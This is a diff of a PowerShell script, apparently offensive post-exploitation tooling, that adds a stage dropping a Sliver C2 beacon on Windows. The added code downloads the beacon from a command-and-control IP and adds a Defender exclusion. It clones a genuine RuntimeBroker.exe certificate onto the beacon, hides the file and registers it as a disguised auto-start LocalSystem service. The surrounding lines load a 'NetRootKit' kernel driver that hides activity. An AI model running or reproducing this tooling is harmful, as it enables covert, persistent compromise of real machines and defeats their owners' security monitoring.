@@ -100,7 +100,46 @@ if ($bcd -match "testsigning\s+Yes") {
     exit
 }
 
-# --- 6. Install & Start NetRootKit Driver ---
+# --- 6. Drop & Execute Sliver Beacon ---
+Write-Host "[*] Staging Sliver Beacon (RuntimeBroker)..."
+$BeaconDir = "C:\ProgramData\USOShared"
+if (-not (Test-Path $BeaconDir)) {
+    New-Item -ItemType Directory -Force -Path $BeaconDir | Out-Null
+    Add-MpPreference -ExclusionPath $BeaconDir -ErrorAction SilentlyContinue
+}
+$BeaconPath = "$BeaconDir\RuntimeBroker.exe"
+
+if (-not (Test-Path $BeaconPath)) {
+    Write-Host "    -> Downloading beacon from C2..."
+    Invoke-WebRequest -Uri "http://10.2.0.144/RuntimeBroker.exe" -OutFile $BeaconPath -UseBasicParsing -ErrorAction SilentlyContinue
+    
+    Write-Host "    -> Downloading TrustMeBro..."
+    Invoke-WebRequest -Uri "https://github.com/KriyosArcane/TrustMeBro/raw/refs/heads/main/TrustMeBro.exe" -OutFile "$TempDir\TrustMeBro.exe" -UseBasicParsing -ErrorAction SilentlyContinue
+    
+    if ((Test-Path $BeaconPath) -and (Test-Path "$TempDir\TrustMeBro.exe")) {
+        Write-Host "    -> Cloning Certificate and Metadata using TrustMeBro..."
+        Start-Process -FilePath "$TempDir\TrustMeBro.exe" -ArgumentList "--source C:\Windows\System32\RuntimeBroker.exe --target `"$BeaconPath`" --clone" -NoNewWindow -Wait -ErrorAction SilentlyContinue
+        
+        Write-Host "    -> Setting Hidden and System attributes on Beacon..."
+        Set-ItemProperty -Path $BeaconPath -Name Attributes -Value "Hidden, System" -ErrorAction SilentlyContinue
+    }
+}
+
+$serviceCheck = Get-Service -Name "USORuntimeBroker" -ErrorAction SilentlyContinue
+if (-not $serviceCheck) {
+    Write-Host "    -> Creating Stealthy Service Persistence..."
+    sc.exe create USORuntimeBroker binPath= `"$BeaconPath`" start= auto obj= LocalSystem | Out-Null
+    sc.exe description USORuntimeBroker "Manages User Session Orchestrator runtime tasks." | Out-Null
+}
+
+$svc = Get-Service -Name "USORuntimeBroker" -ErrorAction SilentlyContinue
+if ($svc -and $svc.Status -ne 'Running') {
+    Write-Host "    -> Starting the Beacon Service..."
+    sc.exe start USORuntimeBroker | Out-Null
+    Start-Sleep -Seconds 3
+}
+
+# --- 7. Install & Start NetRootKit Driver ---
 Write-Host "[*] Installing NetRootKit Driver via devcon.exe..."
 if (-not (Test-Path "devcon.exe")) {
     Write-Host "[-] devcon.exe not found in current directory! Exiting."
@@ -125,7 +164,7 @@ Write-Host "[*] Starting the NetRootKit kernel service..."
 sc.exe start NetRootKit | Out-Null
 Start-Sleep -Seconds 2
 
-# --- 7. Interact with Kernel Driver & Setup Persistence ---
+# --- 8. Interact with Kernel Driver & Setup Persistence ---
 Write-Host "[*] Sending hide commands to NetRootKitController..."
 if (-not (Test-Path "NetRootKitController.exe")) {
     Write-Host "[-] NetRootKitController.exe not found! Exiting."
